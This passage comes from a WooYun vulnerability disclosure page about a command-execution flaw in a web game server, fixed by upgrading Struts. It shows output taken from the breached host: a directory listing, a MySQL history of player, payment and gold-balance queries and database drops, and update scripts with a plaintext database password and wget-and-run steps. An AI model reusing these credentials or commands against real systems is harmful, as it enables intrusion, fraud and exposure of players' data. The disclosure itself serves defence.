-rw-r--r--  1 astd astd  226 Jun 28 12:47 dowload.sh<br />
-rw-r--r--  1 astd astd   90 Jun  9 16:54 duowan_58_0609<br />
-rw-rw-r--  1 astd astd   27 Jun 28 15:26 duowan_58.log<br />
-rw-rw-r--  1 astd astd    0 Jun 28 15:26 duowan_58_ticket.flag<br />
drwxr-xr-x  3 astd astd 4.0K Jun 17 11:45 kfz_tools<br />
-rw-------  1 astd astd   35 Jun 27 18:17 .lesshst<br />
-rw-r--r--  1 astd astd 1.5K Jul  4 19:03 log_conf.template8<br />
-rw-rw-r--  1 astd astd  489 May 23 10:57 make_tgz.sh<br />
-rw-------  1 astd astd 5.8K Jun 27 18:16 .mysql_history<br />
-rw-r--r--  1 root root 5.8K Jul 15 11:05 .mysql_history_bak<br />
drwxr-xr-x  2 astd astd 4.0K May 15  2012 .ncftp<br />
-rw-r--r--  1 astd astd   11 Jun  9 16:55 peiyou_64_0609<br />
-rw-rw-r--  1 astd astd   22 Jun 28 15:27 peiyou_64.log<br />
-rw-r--r--  1 astd astd 1.2K Jun 27 10:59 set_event.sh<br />
drwx------  2 astd astd 4.0K May  3 11:45 .ssh<br />
-rw-rw-r--  1 astd astd 1.1K Jul  8 17:36 tj.sh<br />
drwx------  2 astd astd 4.0K May  9 10:19 tools<br />
-rw-r--r--  1 astd astd   66 Jul  4 17:45 update_0704.sql<br />
-rw-r--r--  1 astd astd 1.1K Jun 27 17:29 update_mail.sh<br />
-rw-r--r--  1 astd astd 1.1K Jun 28 15:16 update_ticket.sh<br />
-rw-------  1 astd astd 1.4K Jun 27 18:16 .viminfo<br />
-rw-r--r--  1 astd astd  284 Jun 16 22:12 .vimrc<br />
-rw-r--r--  1 astd astd   92 Jun  9 16:57 yaowan_253_0609<br />
-rw-rw-r--  1 astd astd   28 Jun 28 15:30 yaowan_253.log<br />
-rw-rw-r--  1 astd astd    0 Jun 28 15:30 yaowan_253_ticket.flag<br />
-rw-r--r--  1 astd astd   92 Jun  9 16:58 zhulang_13_0609<br />
-rw-rw-r--  1 astd astd   28 Jun 28 15:31 zhulang_13.log<br />
-rw-rw-r--  1 astd astd    0 Jun 28 15:31 zhulang_13_ticket.flag<br />
cat .mysql_history<br />
_HiStOrY_V2_<br />
\040show\040databases;<br />
create\040database\040tomcat_178_13;<br />
create\040database\040tomcat_mix_80;<br />
\040show\040databases;<br />
drop\040database\040tomcat_178_13;<br />
drop\040database\040tomcat_mix_80;<br />
create\040database\040neice_178_13;<br />
create\040database\040neice_duowan58;<br />
create\040database\040neice_mix_80;<br />
create\040database\040neice_zl13;<br />
\040show\040databases;<br />
\040show\040databases;<br />
\040show\040databases;<br />
use\040neice_178_13;<br />
select\040count(*)\040from\040player;<br />
select\040count(*)\040from\040neice_duowan58.player;<br />
select\040count(*)\040from\040neice_mix_80.player;<br />
select\040count(*)\040from\040neice_zl13.player;<br />
\040show\040databases;<br />
show\040databases;<br />
use\040neice_zl13;<br />
select\040*\040from\040player\040where\040\040player_name=&quot;SDHAS&quot;;<br />
show\040tables;<br />
desc\040pay_detail_record;<br />
desc\040player_key_statistics;<br />
select\040*\040from\040player\040where\040\040player_name=&quot;SDHAS&quot;;<br />
select\040*\040from\040player_key_statistics\040where\040user_id=6515636;<br />
select\040*\040from\040player\040where\040\040player_name\040in\040(&quot;SDHAS&quot;,&quot;SDNeR&quot;,&quot;DFJD&quot;,&quot;\M-e\M^B\M-2\M-d\M-8\M^V\M-g\M^A\M-,Say&quot;);<br />
select\040*\040from\040player_key_statistics\040where\040user_id=6515636<br />
;<br />
select\040*\040from\040player_key_statistics\040where\040user_id=6515636<br />
;<br />
select\040*\040from\040pay_detail_record\040where\040player_id=15783;<br />
select\040*\040from\040pay_detail_record\040where\040player_id=46100;<br />
select\040*\040from\040pay_detail_record\040where\040player_id=34673<br />
;<br />
select\040*\040from\040pay_detail_record\040where\040player_id=46182;<br />
select\040order_id,pay_time,charge,player_name\040from\040pay_detail_record,player\040where\040player.player_id=pay_detail_record.player_id\040where\040pay_detail_record.player_id=46182;<br />
select\040order_id,pay_time,charge,player_name\040from\040pay_detail_record,player\040where\040player.player_id=pay_detail_record.player_id\040and\040pay_detail_record.player_id=46182;<br />
tee\040/tmp/zhulang.txt<br />
select\040order_id,pay_time,charge,player_name\040from\040pay_detail_record,player\040where\040player.player_id=pay_detail_record.player_id\040and\040pay_detail_record.player_id=46182;<br />
select\040*\040from\040player\040where\040\040player_name\040in\040(&quot;SDHAS&quot;,&quot;SDNeR&quot;,&quot;DFJD&quot;,&quot;\M-e\M^B\M-2\M-d\M-8\M^V\M-g\M^A\M-,Say&quot;);<br />
use\040neice_zl13;<br />
select\040*\040from\040player\040where\040\040player_name\040in\040(&quot;SDHAS&quot;,&quot;SDNeR&quot;,&quot;DFJD&quot;,&quot;\M-e\M^B\M-2\M-d\M-8\M^V\M-g\M^A\M-,Say&quot;);<br />
select\040*\040from\040player\040where\040\040player_name\040in\040(&quot;SDHAS&quot;,&quot;SDNeR&quot;,&quot;DFJD&quot;,&quot;\M-e\M^B\M-2\M-d\M-8\M^V\M-g\M^A\M-,Say&quot;)<br />
\134g<br />
select\040*\040from\040player\040where\040\040player_name\040in\040(&quot;SDHAS&quot;,&quot;SDNeR&quot;,&quot;DFJD&quot;,&quot;\M-e\M^B\M-2\M-d\M-8\M^V\M-g\M^A\M-,Say&quot;)<br />
\134G<br />
\134q<br />
show\040databases;<br />
use\040neice_mix_80;<br />
desc\040player;<br />
select\040*\040from\040player\040where\040yx=&quot;yaowan&quot;\040limit\04010;<br />
select\040*\040from\040player\040where\040yx=&quot;peiyou&quot;\040limit\04010;<br />
\134q<br />
show\040databases;<br />
use\040neice_mix_80;<br />
desc\040player;<br />
show\040tables;<br />
select\040*\040from\040server_data;<br />
update\040server_data\040set\040s_value=s_value+163612\040where\040id=2;<br />
select\040*\040from\040server_data;<br />
update\040server_data\040set\040s_value=s_value+80926\040where\040id=3;<br />
select\040*\040from\040server_data;<br />
\134q<br />
show\040databases;<br />
drop\040database\040neice_mix_88;<br />
show\040databases;<br />
\134q<br />
show\040databases;<br />
use\040neice_178_13;<br />
show\040tables;<br />
desc\040player;<br />
select\040player_id,player_name,SYS_GOLD,USER_GOLD,user_id,user_id_2\040from\040player\040where\040player_name=&quot;\M-h\M^I\M-&gt;\M-e\M-&gt;\M-7&quot;;<br />
update\040player\040set\040SYS_GOLD=SYS_GOLD-5000,version+1\040where\040player_id=4129;<br />
update\040player\040set\040SYS_GOLD=SYS_GOLD-5000,version=version+1\040where\040player_id=4129;<br />
select\040player_id,player_name,SYS_GOLD,USER_GOLD,user_id,user_id_2\040from\040player\040where\040player_name=&quot;\M-h\M^I\M-&gt;\M-e\M-&gt;\M-7&quot;;<br />
select\040player_id,player_name,SYS_GOLD,USER_GOLD,user_id,user_id_2\040from\040player\040where\040player_name=&quot;\M-h&quot;\M-f\M^H\M^X\M-g\M-%\M^^\M-e\M^P\M^U\M-e\M-8\M^C&quot;;<br />
q<br />
;<br />
q<br />
by<br />
bye<br />
\134q<br />
;<br />
&quot;<br />
show\040databases;<br />
use\040neice_178_13;<br />
desc\040player;<br />
select\040player_id,player_name,SYS_GOLD,USER_GOLD,user_id,user_id_2\040from\040player\040where\040player_name=&quot;\M-f\M^H\M^X\M-g\M-%\M^^\M-e\M^P\M^U\M-e\M-8\M^C&quot;;<br />
update\040player\040set\040SYS_GOLD=SYS_GOLD-5000,version=version+1\040where\040player_id=10123;<br />
select\040player_id,player_name,SYS_GOLD,USER_GOLD,user_id,user_id_2\040from\040player\040where\040player_name=&quot;\M-f\M^H\M^X\M-g\M-%\M^^\M-e\M^P\M^U\M-e\M-8\M^C&quot;;<br />
select\040player_id,player_name,SYS_GOLD,USER_GOLD,user_id,user_id_2\040from\040player\040where\040player_name=&quot;\M-f\M^H\M^X&quot;\M-h\M^I\M-&gt;\M-e\M-&gt;\M-7&quot;;<br />
\040show\040databases;\040<br />
use\040neice_mix_80<br />
select\040distinct\040yx\040from\040player;<br />
select\040*\040from\040player\040where\040yx\040=\040&#039;yaowan&#039;\040limit\0405;<br />
\134q<br />
\040show\040databases;\040<br />
drop\040database\040neice_mix_86;<br />
\134]q<br />
\134q<br />
\040show\040databases;\040<br />
use\040neice_mix_80;<br />
select\040*\040from\040server_date;<br />
select\040*\040from\040server_data;<br />
update\040server_data\040set\040s_value\040=\040s_value\040+\040188775\040where\040id\040=\0402;<br />
update\040server_data\040set\040s_value\040=\040s_value\040+\04091895\040where\040id\040=\0403;<br />
select\040*\040from\040server_data;<br />
\134q<br />
\040show\040databases;<br />
drop\040database\040neice_178_15;<br />
\134q<br />
show\040databases;<br />
use\040neice_zl13<br />
\040\134.\040\040huangbaowu.sql<br />
\134q<br />
show\040databases;<br />
use\040neice_duowan58;<br />
select\040*\040From\040user_map;<br />
use\040neice_mix_80;<br />
select\040*\040From\040user_map;<br />
drop\040database\040neice_mix_80<br />
;<br />
create\040database\040neice_mix_80<br />
;<br />
\134q<br />
show\040databases;<br />
\134q<br />
show\040databases;<br />
show\040databases;<br />
use\040astd_178_13;<br />
delete\040from\040mail\040where\040title=&quot;\M-e\M-:\M^F\M-f\M^T\M-9\M-g\M^I\M^H\M-o\M-&lt;\M^L\M-g\M-%\M--\M-g\M-%\M^@\M-f\M-4\M-;\M-e\M^J\M-(\M-e\M-%\M^V\M-e\M^J\M-1\M-g\M^B\M-9\M-e\M^H\M-8&quot;\040and\040send_time&gt;&quot;2013-06-27\04017:00:00&quot;;<br />
\134q<br />
cat updata_mail.sh<br />
cat: updata_mail.sh: No such file or directory<br />
ls<br />
178_13_0609<br />
178_13.log<br />
178_13_ticket.flag<br />
astd_178_13_20130531<br />
astd_duowan_58_20130531<br />
astd-listener.jar<br />
astd_patch_astd_7-9-0-3_20130628.tar.gz<br />
astd_peiyou_64_20130531<br />
astd_peiyou_64.tgz<br />
astd_update_7-9-0_global.sh<br />
astd_update_7-9-0.sh<br />
astd_yaowan_253_20130531<br />
astd_zhulang_13_20130531<br />
dbbak<br />
dowload.sh<br />
duowan_58_0609<br />
duowan_58.log<br />
duowan_58_ticket.flag<br />
kfz_tools<br />
log_conf.template8<br />
make_tgz.sh<br />
peiyou_64_0609<br />
peiyou_64.log<br />
set_event.sh<br />
tj.sh<br />
tools<br />
update_0704.sql<br />
update_mail.sh<br />
update_ticket.sh<br />
yaowan_253_0609<br />
yaowan_253.log<br />
yaowan_253_ticket.flag<br />
zhulang_13_0609<br />
zhulang_13.log<br />
zhulang_13_ticket.flag<br />
cat update_mail.sh<br />
#!/bin/bash<br />
DATE=`date +%Y%m%d`<br />
if [ -f /home/astd/$1_mail.flag ];then<br />
    echo &quot;$1 have insert mail&quot;<br />
else<br />
PATH_dir=/app/astd_$1/logs/Game/DayReport<br />
if [ -d $PATH_dir ];then<br />
    ps x |grep -w astd_$1|grep -v grep &amp;&gt;/dev/null<br />
    if [ $? -eq 0 ];then<br />
        rm /app/astd_$1/logs/Game/DayReport/*sh<br />
        rm /app/astd_$1/logs/Game/DayReport/*sql<br />
        rm /app/astd_$1/logs/Game/DayReport/*txt<br />
        wget -q -P $PATH_dir http://10.6.20.241/astd/patch/jisi_mail/jisi_mail_$DATE.sh <br />
        dbname=astd_$1<br />
        if [ -s $PATH_dir/jisi_mail_$DATE.sh ];then<br />
            cd $PATH_dir<br />
            sh jisi_mail_$DATE.sh<br />
            if [ -s $PATH_dir/mail.sql -a $? == 0 ];then<br />
                /usr/local/mysql/bin/mysql -uastd -p9BdcPAH4w -D$dbname &lt;$PATH_dir/mail.sql<br />
            if [ $? == 0 ];then<br />
                echo &quot;update $dbname SUCC&quot;<br />
                    touch /home/astd/$1_mail.flag<br />
            fi<br />
            fi<br />
        fi<br />
    else<br />
        echo &quot;$1 is not exist&quot;<br />
        exit 0<br />
    fi<br />
else<br />
    echo &quot;$1 is not main&quot;<br />
    exit 0<br />
fi<br />
fi<br />
<br />
cat update_ticket.sh<br />
#!/bin/bash<br />
if [ -f /home/astd/$1_ticket.flag ];then<br />
    echo &quot;$1 have insert mail&quot;<br />
else<br />
PATH_dir=/app/astd_$1/logs/Game/DayReport<br />
if [ -d $PATH_dir ];then<br />
    ps x |grep -w astd_$1|grep -v grep &amp;&gt;/dev/null<br />
    if [ $? -eq 0 ];then<br />
        rm /app/astd_$1/logs/Game/DayReport/*sh<br />
        rm /app/astd_$1/logs/Game/DayReport/*sql<br />
        rm /app/astd_$1/logs/Game/DayReport/*txt<br />
        wget -q -P $PATH_dir http://10.6.20.241/astd/temp/jisi_20130628.sh <br />
        dbname=astd_$1<br />
        if [ -s $PATH_dir/jisi_20130628.sh ];then<br />
            cd $PATH_dir<br />
            sh jisi_20130628.sh<br />
            if [ -s $PATH_dir/mail.sql -a $? == 0 ];then<br />
                /usr/local/mysql/bin/mysql -uastd -p9BdcPAH4w -D$dbname &lt;$PATH_dir/mail.sql<br />
                /usr/local/mysql/bin/mysql -uastd -p9BdcPAH4w -D$dbname &lt;$PATH_dir/ticket.sql<br />
            if [ $? == 0 ];then<br />
                echo &quot;update $dbname SUCC&quot;<br />
                    touch /home/astd/$1_ticket.flag<br />
            fi<br />
            fi<br />
        fi<br />
    else<br />
        echo &quot;$1 is not exist&quot;<br />
        exit 0<br />
    fi<br />
else<br />
    echo &quot;$1 is not main&quot;<br />
    exit 0<br />
fi<br />
fi</code></pre><p class='detail'> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">升级最新的Struts。 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪猪侠" title="猪猪侠">猪猪侠</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-028937" title="某知名WebGame游戏服务端 存在命令执行漏洞">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：20 </p>
													<p class="detail">确认时间：2013-07-15 15:55</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">谢谢猪猪侠！</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="28937";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
